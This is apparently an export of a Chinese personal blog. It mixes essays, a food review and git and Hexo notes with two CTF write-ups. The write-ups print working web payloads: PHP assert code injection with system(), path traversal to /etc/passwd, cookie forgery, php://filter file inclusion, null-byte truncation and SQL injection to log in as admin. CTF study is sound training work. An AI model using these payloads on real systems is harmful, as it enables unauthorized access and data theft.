[{"title":"可以说话的人","date":"2017-07-12T12:34:52.000Z","path":"2017/07/12/the-seed/","text":"随便聊聊。 靠在窗外的人 读着窗边的景初中高中的时候经常会在空间或者朋友圈发些简短的话，诸如“不是雪晚了，只是年早了（记某次终于到来的雪，很兴奋，看了以往的日历才发现，是那年年过得早，所以才有雪来得迟的感受）”，“把书夹在光里（第一次见到那种夹子式的移动台灯的时候，把它夹在了硬皮书上然后靠在床前阅读）”，类似的还有很多，似乎变成了动态圈的一股清流，也不求多少赞，不想多少评论，只是想说，就说了。（那时候也不会想到这些话会成为水母喜欢自己的一部分理由）。现在很少发朋友圈之类的，其一是多了些可以说话的人，其二是单纯得觉得圈里少了些有趣的东西，同样的立意，不一样的内容与样式，而已。当然不同的人会采取不同的表达方式，所以衍生出了各种各样的圈子，过得开心即可。 每个阶段的“回家”都是有不同的意义的。 其实一直很羡慕有弟弟妹妹的人，大概是“独生”带来的某种程度的孤独感太过真实了吧。于是可以说话的“人”，从小时候的玩具，到游戏里的熟人，到窗外的天空，云与太阳，到曾经觉得会合不来现在却无话不说的挚友，到水母玲，每个阶段都有独到的故事在。 这里没有提到父母或者各类长辈，不清楚其他家的情况所以不作大体的评价，不过对于我自己，其实在物质得到一定的满足之后，会转而追求一些精神上的东西，而这些是更偏向物质追求的那一代很难给予的，他们会以经验，以自己的想法告诉你，应该怎么去做，家长，孩子，男人，女人，这些的区别在他们的眼里有时候太过强烈了，以致于你做了一件你想做的事可能会被说，你不能这么做，你是男孩子所以要强硬不能柔软，你是女孩子所以不要经常出去玩，你是小孩不要听我们讲话，不要管大人的事，专心读书就好，之类，（这样看来女装反而是一种思想的解放呢hh）就比如不管大人的事，其实孩子很聪明，学语言的速度就比大人快上很多，这样的学习能力，以“大人的事”来限制一些思想的开拓，其实觉得挺可惜的（也算是之后很长一段时间不太爱和他们说话的原因吧）。 以前会觉得不舒服，会闹脾气，随意得不理他们，一是确实不喜欢一些做法和说法，二是前一段时间才想到的，可能觉得无论自己怎么耍性子他们都不会离开自己丢下自己，所以潜意识里助长了一些任性呢。好在自己也是个比较平静的人，不会太过生气，不会太过任性，即使偶尔有些意见的争执，不是无意义的大吵大闹就可以接受。以及，他们确实是爱着自己关心着自己的 —— 以他们自己的方式。虽然作为一个个体，我们拥有管理自己的情绪和释放自己属性的权利 —— 只是合适不合适的问题。比较“妥善”的释放，不仅可以最大限度地解压，也是一种成熟的体现吧。学会控制是门艺术，它不是对自己的压抑，反而是种引导式的增益。 对自己也好，对其他关心甚至爱着自己的人也好。 靠在窗外的人，读着窗边的景。 搬到新家以后，会经常靠在客厅的窗边看着窗外的天。没有任何建筑的遮挡，视野获得了最大程度的自由。会觉得离天空很近，离太阳很近，离风很近，离云很近，离飞鸟很近，离生命很近。他们每天走着不一样的轨迹，但却丰满而深刻。拍了很多这个位置这个视角下的照片，每一张都不一样，情理之中。不过我不是说景色的搭配不一样，而是他们所展现的力量，是色彩的灵活搭配下深度展现给我，带给我震撼感的东西。 天空是会说话的，如果你用心说，如果你用心听。那段日子，虽然大人们看来是“很无聊的发呆”，自己却觉得是意外的充实与滋润。 交心前段时间回归了一下以前玩过的一款游戏，果然还是热爱着RPG呢。因为剧情和地图人设都觉得做得不错，就安利给了女友，一起玩了会儿，也算是了了一个心愿呢。惊喜的是她也很喜欢这款游戏，不过随着等级的上升，遇到使用第三方插件的玩家越来越多，不对，不应该称作玩家，而是商人吧。抢占着地图与道具，把正常玩家挤下线，并严重阻碍着任务的完成度。 这是款冷了很久的游戏，当初退出它就是因为过分的商业化，而代理商并没有解决问题的力量，不如说不愿去解决吧。吃相并不好看。好好的游戏体验，只能在回忆里体验到了。即使喜欢着游戏本身，女友也因为受不了这点，不出几日便删了游戏。有太多的脏话想说。然而该说的几年前就说了，现在能找到一些记忆里的体验就已经很棒了。 除了这款游戏，还有的比较深印象的是初中的时候逛着贴吧找到了[异次元服务器]，一个用服务器搭着MC进行游戏的小圈子。以前觉得弄服务器什么的很厉害，但是后来才知道其中大部分人是比自己还小的，也更说明了孩子的学习能力的强力呢。当然我在这里想说的不是游戏的体验，而是一些其他的东西。一起玩过游戏的人，有的已经结婚生子，有的还在积极备考，有的是和自己一样或者相似的人。很多人可能都没有见过面，但是现在还有着一些联系，很感动。在这种充斥着不信任的时代里，这种温暖显得难得可贵，即使隔着屏幕，也能感受到一些亲和。 我称这种体验为交心。 当然离我们更近的交心体验还是朋友间，恋人间的。嗯也借这个机会谈谈一些恋爱观与设想吧。 其实成长到现在，不仅是自己，整个社会的恋爱观都在发生着变化，从以前的连靠得很近都觉得是种羞耻的时代到了可以大胆去表达，表现爱的时代，觉得也是种进步呢，也是种解放。年轻人们有着自己的方式与理解去决定如何去爱，最主要的是如何去选择对象与对自己身体的开放程度，比如现在的勾肩搭背搂抱可能是以前的人所无法接受的呢。当然远不止这些。 这些概括起来大致是[选择权]的提升吧，说起来本该拥有的东西现在被赋予了或者说争取到了还觉得开心，其实有点奇怪呢。","tags":[{"name":"绿生","slug":"绿生","permalink":"https://icyris.github.io/tags/绿生/"},{"name":"卡萨布兰卡","slug":"卡萨布兰卡","permalink":"https://icyris.github.io/tags/卡萨布兰卡/"}]},{"title":"hexo博客图片问题解决办法","date":"2017-07-12T11:46:06.000Z","path":"2017/07/12/blog-picture-issue/","text":"关于hexo博客图片无法正常显示的问题的解决办法。 之前一直用的MarkdownPad2自带的添加图片按钮来添加图片（存储在hexo/source/imag里），但是经常会有显示不出的情况，不喜欢用各大图床，于是查了一波本地存储上传的方法，找到了一个插件来修正img标签以使图片正常显示。 参考自简书。 0x01 Asset设定确认首先确认_config.yml 中有 post_asset_folder:true。这时候每次hexo new会自动建立一个与文章同名的文件夹，我们可以把与该文章相关的所有资源都放到那个文件夹，来更方便得调用资源。 0x02 插件添加在hexo文件夹执行： 1. npm install https://github.com/CodeFalling/hexo-asset-image --save 0x03 图片添加完成安装后新建一个文件试试，发现在.md文件同级目录下会有一个同名文件夹。比如我们新建了一个文件blog-picture-issue.md，然后在同名文件夹里放张图：1.PNG。 之后在md文件里加入下面的语句即可： ![](blog-picture-issue/1.PNG) []里是图片的名称，可不写。 0x04 issued这样的操作以后生成的html是： &lt;img src=&quot;/2017/07/12/blog-picture-issue/1.PNG&quot; alt=&quot;logo&quot;&gt; 而非之前的： &lt;img src=&quot;blog-picture-issue/1.PNG&quot; alt=&quot;logo&quot;&gt; 使得图片正常显示。","tags":[{"name":"hexo","slug":"hexo","permalink":"https://icyris.github.io/tags/hexo/"}]},{"title":"OpenCTF WriteUp","date":"2017-07-03T09:01:47.000Z","path":"2017/07/03/OpenCTF/","text":"软件嘉年华部分题的题解。因为是后来才做的，所以看了下队里拉的文档，文章内会注明思路提供者，这里仅作为学习笔记(｡･∀･)ﾉﾞ。 WEBweb125URL: http://202.112.51.184:8001 参考链接： https://github.com/bl4de/ctf/blob/master/2016/CSAW_CTF_2016/mfw/mfw_web125.md 在about页面看到：1234I used: - Git - PHP - Bootstrap 先从/.git里拖个源码，这里用的GitHack： 1GitHack.py http://202.112.51.184:8001/.git/ flag.php里的： 1234&lt;?php// TODO// $FLAG = '';?&gt; index.php里的关键代码： 1234567891011121314151617181920&lt;?phpif (isset($_GET['page'])) &#123; $page = $_GET['page'];&#125; else &#123; $page = \"home\";&#125;$file = \"templates/\" . $page . \".php\";// I heard '..' is dangerous!assert(\"strpos('$file', '..') === false\") or die(\"Detected hacking attempt!\");// TODO: Make this look niceassert(\"file_exists('$file')\") or die(\"That file doesn't exist!\"); ?&gt;&lt;?php require_once $file;?&gt; 比较菜只能做到这里。之后一叶知秋利用assert函数引起的代码注射构造payload：1?page='.system(\"cd /var/www/html/;git diff;\").'about 得到12345678910diff --git a/templates/flag.php b/templates/flag.phpindex f8c9436..1d552ec 100644--- a/templates/flag.php+++ b/templates/flag.php@@ -1,4 +1 @@-&lt;?php-// TODO-// $FLAG = '';-?&gt;+&lt;?php $FLAG=\"xctf&#123;392dba36b0998deac2ed87ceca63c4b2&#125;\"; ?&gt; 关于payload里的”/var/www/html/“，可以看看https://stackoverflow.com/questions/16197663/what-is-var-www-html web150, 400URL: http://202.112.51.184:8002/ 参考链接： https://thegoonies.rocks/csaw-2016-wtf-sh-web/ https://github.com/ernw/ctf-writeups/tree/master/csaw2016/wtf.sh web150和web400这两题在上面的链接里都有详细的解答过程，这里稍微记录一下。 题目里有个登陆页面，想到passwd文件存放在/etc目录下，尝试构造 1http://202.112.51.184:8002/profile.wtf?user=../../../../../../etc/passwd 得到响应： 1root:x:0:0:root:/root:/bin/bash's posts: 再尝试读取 1http://202.112.51.184:8002/post.wtf?post=../users/ 拉下来的列表里有一条包含admin的hash值与id的信息： 1234&lt;div class=\"post\"&gt;&lt;span class=\"post-poster\"&gt;Posted by &lt;a href=\"/profile.wtf?user=Cv3uk\"&gt;admin&lt;/a&gt;&lt;/span&gt;&lt;span class=\"post-title\"&gt;822ec9ffd8e2e720b59e75d5c9047d690747af3e&lt;/span&gt;&lt;span class=\"post-body\"&gt;tENOEU4RlJqSGPJn1O/eNASiC89NL699v96lgpg1muh5jqIq/oDjonRho8mvT6wB30xNnloGtRUBRBbT8ub0MA==&lt;/span&gt; 进入admin相关页面1http://202.112.51.184:8002/profile.wtf?user=Cv3uk 然后伪造下cookie： 1. USERNAME = admin 2. __cfduid = 822ec9ffd8e2e720b59e75d5c9047d690747af3e 3. TOKEN = tENOEU4RlJqSGPJn1O/eNASiC89NL699v96lgpg1muh5jqIq/oDjonRho8mvT6wB30xNnloGtRUBRBbT8ub0MA== 最后在页面底部拿到flag。 400分的题水平不够没写出来，看看上面的wp吧。 web200URL: http://202.112.51.184:8000/cgi-bin/forms.pl原题： https://github.com/isislab/CSAW-CTF-2016-Quals/tree/master/Web/I%20Got%20Id 没太看懂解法，还在问土土师傅，之后补充。 Cryptocrypto 100小明今天去妹纸家开Party,而妹纸却给他出了一个谜语,说只要他能答出来,她就会答应小明一个要求. 这是妹纸给小明的谜语序列:EW91X2FYZV9HX2DVB2RFYM95= 适当把大写字母改成小写然后base64解一下就可以了。 crypto 150URL: http://hdopen.xctf.org.cn/media/task/58f1ec51-bf9e-43fa-bd77-c1cc423e3cf4.rar 分享一份veritas501关于带密码压缩包题的思路整理：http://veritas501.space/2017/06/23/给你压缩包却不给你密码的人到底在想什么/#more 这题采用的是crc32碰撞法。","tags":[{"name":"ctf","slug":"ctf","permalink":"https://icyris.github.io/tags/ctf/"},{"name":"OpenCTF","slug":"OpenCTF","permalink":"https://icyris.github.io/tags/OpenCTF/"}]},{"title":"菠萝牛肉饭","date":"2017-07-02T03:54:20.000Z","path":"2017/07/02/tea-maker/","text":"菠萝，青菜，牛肉，米饭，芝麻，番茄蛋汤。 番茄蛋汤精灵挺喜欢香港岛的老板的，一个带点广东口音的大叔，店里有鱼有猫，靠近门口的地方有张小桌子，上面堆了些有种年代意象的玩物，平时戴着细框眼镜，很是友好，买单时会跟你说谢谢，很平静的那种，静到直深心骨，声音有种大漠般的饱满，总之光那几声谢谢，也会再一次进店享食。 在这里用餐还是挺奢侈的，两个人可以吃到50+，但是东西量很足，第一次来点菜难免会浪费，量足的同时味也很足，整个店都有老板的那种气质，印象比较深的便是那份菠萝牛肉饭，汁液包裹着菠萝青菜与牛肉，这些食材的味道又锁在了汤汁里，交错相关，很是融洽。米饭虽也在一个盘子里却保持着很难得的干净，夫人会很喜欢这样的米饭，有着它该有的独立剔透的味道。我比较喜欢喝汤，所以这份饭到最后基本会被我用汤汁浇淋全身，米香即被困在了一层透明丝滑之下。吃得很愉快。老板娘还很贴心的送了份番茄蛋汤，味道也很出色。说到番茄蛋汤，不得不提一下番茄蛋汤精灵@Acaleph，靠一碗汤就可以让我吃完一顿饭的水母宝贝。 “成为优秀厨师的诀窍就是…遇上一个足以让你想要将自己所有的料理，都献给她的女人。” —— 食戟之灵 最早来这里是橙子介绍的，喝的生滚粥，肉片煮得很有力度，量也很够，一份粥两个人也可以吃饱。里边还有几片生菜，妖娆得躺在粥里，忍不住想揪出来咬几口。生滚粥当然主要品的是粥啦，粥也是很棒，记得连续吃了好几天，它与盛放它的黑色砂锅有着相近的味道，也表现着老板的那种气质——饱满沧桑却近人有力。 在这里，食物有着它该有的味道。在吃腻了外卖的那种干燥后，很长一段时间胃口处于闭塞的状态，偶然点的一份菠萝牛肉饭，解锁了一些新的体验。 点亮宿舍的柠檬由随手翻倒的满杯的柠檬绿茶所释放的意象怪物。 某家店的饮品里常常会放入大只的果块果片，基本啃完了水果茶水也就剩下一点，放了冰块的东西得趁冷喝，热了化了淡了，这杯饮品迷人的地方就少了，那种有点先前的调味但是又掺杂着融化的人工冰块的塑料味的东西，不是很能接受，以后也不会。 急着开电脑打翻了杯刚买的柠檬茶，不开心，其实最近遇到了很多不顺心的事，知道要去调整，却惰于烦躁与抱怨。倒翻的绿茶很无意地点亮了这个地方，擦干地面的时候，有很舒服的味道充盈着这间屋子，降温消燥，忙着期末考好久未拖的地，也趁着这个机会干净了一把。 看似坏的东西也不一定全是坏事，也可能是以一小部分的坏抵消了一大部分的坏也说不准。 看起来有点像毒鸡汤，于是上个删除线。不会喜欢鸡汤类的东西，并不是那么适合大部分人，有时候还会变成强扭某种境遇的措辞，看着不是很舒服。当然翻倒的柠檬水的清香是真，这个体验是真实存在的，也的确愉悦了一会儿，再过一会儿味道没了，便又回到了一股燥热中。以及地面似乎没拖干净，黏，乎，乎…… 寂静的盖饭，雄辩的盖饭你们好ya我是占位符","tags":[{"name":"绿生","slug":"绿生","permalink":"https://icyris.github.io/tags/绿生/"},{"name":"柠檬之涩","slug":"柠檬之涩","permalink":"https://icyris.github.io/tags/柠檬之涩/"},{"name":"番茄蛋汤","slug":"番茄蛋汤","permalink":"https://icyris.github.io/tags/番茄蛋汤/"}]},{"title":"NCTF WriteUp","date":"2017-06-01T08:28:25.000Z","path":"2017/06/01/NCTF/","text":"南邮NCTF训练平台里一些题的wp。 Web0x01 签到2 50URL: http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php 得到这样一个页面： 尝试输入： zhimakaimen 但是发现输入到倒数第二个e就输入不下去了，F12：1234&lt;p&gt;输入框：&lt;input value=\"\" name=\"text1\" maxlength=\"10\" type=\"password\"&gt;&lt;br&gt;请输入口令：zhimakaimen &lt;input value=\"开门\" type=\"submit\"&gt;&lt;/p&gt; 把maxlength改成100，重新输入口令得到flag： flag is:nctf{follow_me_to_exploit} 0x02 这题不是WEB 100URL: http://chinalover.sinaapp.com/web2/index.html 打开后是一张gif猫，下载到本地。记事本打开得到flag： nctf{photo_can_also_hid3_msg} 0x03 层层递进 100URL: http://chinalover.sinaapp.com/web3/ 进去是个企业网站，一开始F12没啥发现，看了WP才知道要访问： http://chinalover.sinaapp.com/web3/404.html再去F12看看发现有一个404.html的页面状态码是304，也是个思路吧，没找仔细….. 得到源码：123456789101112131415161718192021222324&lt;td&gt;&lt;!-- Placed at the end of the document so the pages load faster --&gt;&lt;!-- &lt;script src=\"./js/jquery-n.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-c.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-t.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-f.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-&#123;.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-t.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-h.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-i.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-s.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-_.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-i.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-s.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-_.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-a.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-_.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-f.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-l.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-4.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-g.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-&#125;.7.2.min.js\"&gt;&lt;/script&gt;--&gt; 手打flag： flag:nctf{this_is_a_fl4g} 0x04 AAencode 100URL: http://chinalover.sinaapp.com/web20/aaencode.txt 查了下AAencode，找到一个在线解密网址：http://utf-8.jp/public/aaencode.html 贴进去跑跑，得到flag： nctf{javascript_aaencode} 0x05 文件包含 100URL: http://4.chinalover.sinaapp.com/web7/index.php 分享篇关于文件包含的文章：https://dollberg.xyz/ctf/2016/12/29/33C3-CTF-list0r/ 然后是php官方手册：http://php.net/manual/zh/wrappers.php.php 通过伪协议读个源码： file=php://filter/read=convert.base64-encode/resource=index.php 得到base64加密后的字符串： PGh0bWw+CiAgICA8dGl0bGU+YXNkZjwvdGl0bGU+CiAgICAKPD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWlmKCEkX0dFVFtmaWxlXSl7ZWNobyAnPGEgaHJlZj0iLi9pbmRleC5waHA/ZmlsZT1zaG93LnBocCI+Y2xpY2sgbWU/IG5vPC9hPic7fQoJJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG8gIk9oIG5vISI7CgkJZXhpdCgpOwoJfQoJaW5jbHVkZSgkZmlsZSk7IAovL2ZsYWc6bmN0ZntlZHVsY25pX2VsaWZfbGFjb2xfc2lfc2lodH0KCj8+CjwvaHRtbD4= 解密后得到flag：12345678910111213141516&lt;html&gt; &lt;title&gt;asdf&lt;/title&gt; &lt;?phperror_reporting(0);if(!$_GET[file])&#123;echo '&lt;a href=\"./index.php?file=show.php\"&gt;click me? no&lt;/a&gt;';&#125;$file=$_GET['file'];if(strstr($file,\"../\")||stristr($file, \"tp\")||stristr($file,\"input\")||stristr($file,\"data\"))&#123; echo \"Oh no!\"; exit();&#125;include($file); //flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;/html&gt; 0x06 Download~! 200URL: http://way.nuptzj.cn/web6/ Tips说不要下载mp3文件，先看下源码：1234567891011121314&lt;div id=\"templatemo_content\"&gt; &lt;div class=\"content_title_01\"&gt;听会歌吧&lt;/div&gt; &lt;div class=\"horizontal_divider_01\"&gt;&amp;nbsp;&lt;/div&gt; &lt;div class=\"cleaner\"&gt;&amp;nbsp;&lt;/div&gt; &lt;p&gt;为了让大家更轻松的比赛，为大家准备了两首歌让大家下载&lt;/p&gt; &lt;p&gt;&lt;a href=\"download.php?url=eGluZ3hpbmdkaWFuZGVuZy5tcDM=\" target=\"_blank\"&gt;星星点灯&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=\"download.php?url=YnV4aWFuZ3poYW5nZGEubXAz\" target=\"_blank\"&gt;不想长大&lt;/a&gt;&lt;/p&gt; &lt;div class=\"cleaner\"&gt;&amp;nbsp;&lt;/div&gt; &lt;/div&gt; 发现下载链接格式均为： download.php?url=base64 其中base64为文件名。还有一个提示是”down”，查询”down.php”的base64编码后构造： http://way.nuptzj.cn/web6/download.php?url=ZG93bi5waHA= 没有得到什么东西。再尝试”download.php”： http://way.nuptzj.cn/web6/download.php?url=ZG93bmxvYWQucGhw 拿到一份php源码：1234567891011121314151617181920??&lt;?phperror_reporting(0);include(\"hereiskey.php\");$url=base64_decode($_GET[url]);if( $url==\"hereiskey.php\" || $url==\"buxiangzhangda.mp3\" || $url==\"xingxingdiandeng.mp3\" || $url==\"download.php\")&#123; $file_size = filesize($url); header ( \"Pragma: public\" ); header ( \"Cache-Control: must-revalidate, post-check=0, pre-check=0\" ); header ( \"Cache-Control: private\", false ); header ( \"Content-Transfer-Encoding: binary\" ); header ( \"Content-Type:audio/mpeg MP3\"); header ( \"Content-Length: \" . $file_size); header ( \"Content-Disposition: attachment; filename=\".$url); echo(file_get_contents($url)); exit;&#125;else &#123; echo \"Access Forbidden!\";&#125;?&gt; 发现还有一个文件hereiskey.php，构造新的payload: http://way.nuptzj.cn/web6/download.php?url=aGVyZWlza2V5LnBocA== 下载得到flag：123?&lt;?php//flag:nctf&#123;download_any_file_666&#125;?&gt; 0x07 md5 collision 50URL: http://chinalover.sinaapp.com/web19/ 参考文档： https://stackoverflow.com/questions/22140204/why-md5240610708-is-equal-to-md5qnkcdzo 给出了源码：123456789101112&lt;?php$md51 = md5('QNKCDZO');$a = @$_GET['a'];$md52 = @md5($a);if(isset($a))&#123;if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123; echo \"nctf&#123;*****************&#125;\";&#125; else &#123; echo \"false!!!\";&#125;&#125;else&#123;echo \"please input a\";&#125;?&gt; php的弱类型问题。a不能等于QNKCDZO但是a的md5值要等于QNKCDZO加密后的md5值。文档里给出的解释是： md5(&apos;240610708&apos;) &apos;s result is 0e462097431906509019562988736854. md5(&apos;QNKCDZO&apos;) &apos;s result is 0e830400451993494058024219903391. They are both float number format strings (numerical strings), and if you use == in php, when compare a number with a string or the comparison involves numerical strings, then each string is converted to a number and the comparison performed numerically. Both of the strings are converted to 0 when compared with ==, if you want to compare them as string, remember to use ===(strict comparison) instead. 构造： http://chinalover.sinaapp.com/web19/?a=240610708 得到flag： nctf{md5_collision_is_easy} 0x08 MYSQL 200URL: http://chinalover.sinaapp.com/web11/ 按提示看了波robots.txt，构造： http://chinalover.sinaapp.com/web11/robots.txt 得到TIP与源码： 12345678910111213141516TIP:sql.php&lt;?phpif($_GET[id]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query(\"select content from ctf2 where id='$id'\")); if ($_GET[id]==1024) &#123; echo \"&lt;p&gt;no! try again&lt;/p&gt;\"; &#125; else&#123; echo($query[content]); &#125;&#125;?&gt; 可以得出flag在sql.php下，需要传入id值，注意到intval函数，这里做了个int型的强转换，于是构造： http://chinalover.sinaapp.com/web11/sql.php?id=1024.1 得到flag： the flag is:nctf{query_in_mysql} 0x09 /x00 200URL: http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php view-source:12345678if (isset ($_GET['nctf'])) &#123; if (@ereg (\"^[1-9]+$\", $_GET['nctf']) === FALSE) echo '必须输入数字才行'; else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE) die('Flag: '.$flag); else echo '骚年，继续努力吧啊~'; &#125; 这里学了一个00截断。首先要满足传入的值是数字，然后又要传入#biubiubiu，用字符截断构造payload： http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=1%00%23biubiubiu 得到flag： Flag: flag:nctf{use_00_to_jieduan} 0x10 bypass again 200URL: http://chinalover.sinaapp.com/web17/index.php 源码：1234567if (isset($_GET['a']) and isset($_GET['b'])) &#123;if ($_GET['a'] != $_GET['b'])if (md5($_GET['a']) === md5($_GET['b']))die('Flag: '.$flag);elseprint 'Wrong.';&#125; 之前有做过类似的，直接构造: http://chinalover.sinaapp.com/web17/index.php?a[]=1&amp;b[]=2 flag： Flag: nctf{php_is_so_cool} 0x11 变量覆盖 200URL: http://chinalover.sinaapp.com/web18/index.php 先看一波source:123456789&lt;?php if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") &#123; ?&gt; &lt;?php extract($_POST); if ($pass == $thepassword_123) &#123; ?&gt; &lt;div class=\"alert alert-success\"&gt; &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt; &lt;/div&gt; &lt;?php &#125; ?&gt; &lt;?php &#125; ?&gt; 题目很明显了的变量覆盖，上hackbar发个post： pass=1&amp;thepassword_123=1 即可拿到flag： nctf{bian_liang_fu_gai!} 这里有个extract函数，可以看看这个：http://www.w3school.com.cn/php/func_array_extract.asp 0x12 SQL注入1 300URL: http://chinalover.sinaapp.com/index.php 123456789101112131415161718&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql=\"select user from ctf where (user='\".$user.\"') and (pw='\".$pass.\"')\"; echo '&lt;/br&gt;'.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]==\"admin\") &#123; echo \"&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;\"; &#125; if($query[user] != \"admin\") &#123; echo(\"&lt;p&gt;You are not admin!&lt;/p&gt;\"); &#125;&#125;echo $query[user];?&gt; 抓住这句： $sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;; 尝试user=admin’)提前闭合的方法，只能看到一条warning Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in index.php on line 14 于是构造新的payload把后面的语句注释掉 admin&apos;) --abc 提交拿到flag Logged in! flag:nctf{ni_ye_hui_sql?}","tags":[{"name":"ctf","slug":"ctf","permalink":"https://icyris.github.io/tags/ctf/"},{"name":"NCTF","slug":"NCTF","permalink":"https://icyris.github.io/tags/NCTF/"}]},{"title":"C++一些良好的编程习惯与要点","date":"2017-05-26T15:00:57.000Z","path":"2017/05/26/C-habit/","text":"丢链接就跑。C++：良好的编程习惯与要点摘录 zizi是个不错的人呢。","tags":[{"name":"C++","slug":"C","permalink":"https://icyris.github.io/tags/C/"}]},{"title":"GIT时光机","date":"2017-05-12T16:17:27.000Z","path":"2017/05/13/git/","text":"Ak师傅的小茶会里谈了些关于git的常见用法，这里做一点笔记。0X系列是git的一些基础命令（整理自阮一峰），1X系列是自己折腾的不算太完整的git与github的配置，使用方式。（附上Ak写的wiki（关于 git reset, git checkout, git revert 的区别与使用场景），还有廖雪峰的Git基础教程。） 0X00 时光机硬件说明书 Workspace： 工作区 Index / Stage： 暂存区 Repository： 本地仓库 Remote： 远程仓库 HEAD： 当前分支 Commit history： 历史记录 0X01 零件组装这里有三种情况： 1.在当前目录新建一个Git代码库（如果是要使用github上的库，需要先pull下来，不然无法push到目标库，这里的第三种方法就可以。） $ git init 2.新建目录，将其初始化为Git仓库 $ git init project-name 3.pull下来一个项目与其代码历史 $ git clone URL 0X02 时光机的配置Git有个设置文件.gitconfig，它可以全局配置，也可以项目配置。 1.显示当前的Git配置 $ git config --list 2.编辑Git配置文件 $ git config -e [--global] 3.设置提交代码时的用户信息 $ git config [--global] user.name &quot;name&quot; $ git config [--global] user.email &quot;email address&quot; 0X03 在时光机上注入add钙奶1.添加指定文件到暂存区 $ git add file1 file2 ... 2.添加指定目录到暂存区（包括其中的子目录） $ git add dir（文件夹名称） 3.添加当前目录所有文件到暂存区 $ git add . 4.分次提交 $ git add -p 5.删除工作区文件，并且把这次删除放入暂存区 $ git rm file1 file2 ... 6.停止追踪指定文件（该文件会保留在工作区） $ git rm --cached file 7.改名文件，然后把这个改名文件放入暂存区 $ git mv file-original file-renamed 0X04 挪挪挪，挪进仓库1.提交暂存区到仓库区 $ git commit -m &quot;message&quot; 2.提交暂存区指定文件到仓库区 $ git commit file1 file2 ... -m &quot;message&quot; 3.提交工作区自上次commit之后的变化，直接到仓库区 $ git commit -a 4.提交时显示所有diff信息 $ git commit -v 5.使用一次新的commit，替代上一次提交。如果代码没有任何新变化，则用来改写上一次commit的提交信息 $ git commit --amend -m &quot;message&quot; 6.重做上一次commit，并包括指定文件的新变化 $ git commit --amend file1 file2 ... 0X05 时光机分机1.列出所有本地分支 $ git branch 2.列出所有远程分支 $ git branch -r 3.列出所有本地分支和远程分支 $ git branch -a 4.新建一个分支，但依然停留在当前分支 $ git branch [branch-name] 5.新建一个分支，并切换到该分支 $ git checkout -b [branch] 6.新建一个分支，指向指定commit $ git branch [branch] [commit] 7.新建一个分支，与指定的远程分支建立追踪关系 $ git branch --track [branch] [remote-branch] 8.切换到指定分支，并更新工作区 $ git checkout [branch-name] 9.切换到上一个分支 $ git checkout - 10.建立追踪关系，在现有分支与指定的远程分支之间 $ git branch --set-upstream [branch] [remote-branch] 11.合并指定分支到当前分支 $ git merge [branch] 12.选择一个commit，合并进当前分支 $ git cherry-pick [commit] 13.删除分支 $ git branch -d [branch-name] 14.删除远程分支 $ git push origin --delete [branch-name] $ git branch -dr [remote/branch] 0X06 Tag1.列出所有tag $ git tag 2.新建一个tag在当前commit $ git tag [tag] 3.新建一个tag在指定commit $ git tag [tag] [commit] 4.删除本地tag $ git tag -d [tag] 5.删除远程tag $ git push origin :refs/tags/[tagName] 6.查看tag信息 $ git show [tag] 7.提交指定tag $ git push [remote] [tag] 8.提交所有tag $ git push [remote] --tags 9.新建一个分支，指向某个tag $ git checkout -b [branch] [tag] 0X07 信息查看1.显示有变更的文件 $ git status 2.显示当前分支的版本历史 $ git log 3.显示commit历史，以及每次commit发生变更的文件 $ git log --stat 4.搜索提交历史，根据关键词 $ git log -S [keyword] 5.显示某个commit之后的所有变动，每个commit占据一行 $ git log 